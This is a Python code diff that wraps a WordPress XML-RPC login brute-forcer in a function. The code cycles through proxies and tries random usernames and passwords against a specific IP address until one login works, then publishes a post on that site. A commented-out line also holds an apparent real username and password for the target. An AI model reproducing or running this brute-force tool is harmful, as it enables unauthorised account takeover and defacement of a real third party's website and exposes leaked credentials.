@@ -45,35 +45,37 @@ class ProxiedTransport(xmlrpc.client.Transport):
         return connection
 
 # server = xmlrpc.client.ServerProxy('http://betty.userland.com', transport=transport)
-i = 0
-while True:
-    proxy_raw, proxy_complete = CheckIfProxySameAsIP()
-    proxy_ip, proxy_port  = proxy_complete.split(":")
-    proxy_port = int(proxy_port)
-    print(proxy_ip, proxy_port)
 
-    transport = ProxiedTransport()
-    transport.set_proxy(proxy_ip, proxy_port, secure=True)
-    # client = Client(url = "https://103.185.193.35/xmlrpc.php", username = "resephariankamu",password="LiG5hqDiMNCacSa", transport=transport)
-    client = Client(url = "https://103.185.193.35/xmlrpc.php", username = NamesPickRandom(),password=PasswordPickRandom(), transport=transport)
+def BruteforceLoginXMLRPC():
+    i = 0
+    while True:
+        proxy_raw, proxy_complete = CheckIfProxySameAsIP()
+        proxy_ip, proxy_port  = proxy_complete.split(":")
+        proxy_port = int(proxy_port)
+        print(proxy_ip, proxy_port)
 
-    try:
-        post = WordPressPost()
-        post.title = 'Nov 27 DI RUMAH'
-        post.content = 'ADAKAH RAYYAN DI HAATIMU'
-        post.post_status = "publish"
-        post.id = client.call(posts.NewPost(post))
-        print("POSTINGAN BERHASIL DIPOST")
-        break
-    except:
-        print(f"BRUTEFORCING XMLRPC - {i}")
-        i = i + 1
-        continue
+        transport = ProxiedTransport()
+        transport.set_proxy(proxy_ip, proxy_port, secure=True)
+        # client = Client(url = "https://103.185.193.35/xmlrpc.php", username = "resephariankamu",password="LiG5hqDiMNCacSa", transport=transport)
+        client = Client(url = "https://103.185.193.35/xmlrpc.php", username = NamesPickRandom(),password=PasswordPickRandom(), transport=transport)
 
-# try:
-#     client.call(posts.EditPost(post.id, post))
-#     success = 1
-# except InvalidCredentialsError:
-#     success = 0
-#     print("incorrect username or password")
+        try:
+            post = WordPressPost()
+            post.title = 'Nov 27 DI RUMAH'
+            post.content = 'ADAKAH RAYYAN DI HAATIMU'
+            post.post_status = "publish"
+            post.id = client.call(posts.NewPost(post))
+            print("POSTINGAN BERHASIL DIPOST")
+            break
+        except:
+            print(f"BRUTEFORCING XMLRPC - {i}")
+            i = i + 1
+            continue
+
+    # try:
+    #     client.call(posts.EditPost(post.id, post))
+    #     success = 1
+    # except InvalidCredentialsError:
+    #     success = 0
+    #     print("incorrect username or password")
 
